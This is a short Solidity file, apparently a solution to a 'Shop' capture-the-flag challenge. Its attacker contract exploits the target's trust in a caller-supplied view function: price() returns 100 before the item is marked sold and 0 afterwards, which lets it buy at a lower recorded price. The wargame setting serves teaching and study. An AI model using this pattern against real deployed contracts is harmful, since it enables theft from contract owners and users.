// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopAttacker {
    IShop public shop;

    constructor(address challengeAddress) public {
        shop = IShop(challengeAddress);
    }

    //price()is interface and view function, not able to change state in contract but can retrun value
    function price() external view returns (uint) {
        if (!shop.isSold()) return 100;
        //it trigger lower price by call this function again after pass condition high price and then set isSold = true
        else return 0;
    }

    function attack() public {
        shop.buy();
    }

}